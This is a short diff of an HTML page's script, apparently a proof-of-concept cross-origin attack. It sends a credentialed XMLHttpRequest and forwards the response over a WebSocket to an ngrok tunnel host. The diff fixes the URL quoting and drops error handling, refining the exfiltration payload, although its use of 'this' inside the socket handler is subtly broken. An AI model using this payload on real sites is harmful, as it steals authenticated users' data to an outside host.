@@ -8,14 +8,10 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    try {
-        var socket = new WebSocket(wss://0.tcp.ap.ngrok.io:11134);
-        socket.onopen = function(event) {
-        socket.send(this.responseText);
+     var socket = new WebSocket('wss://0.tcp.ap.ngrok.io:11134');
+socket.onopen = function(event) {
+  socket.send(this.responseText); // send the response from the initial XMLHttpRequest
 };
-    } catch (e) {
-        console.error(e);
-    }
 };
 </script>
 </body>
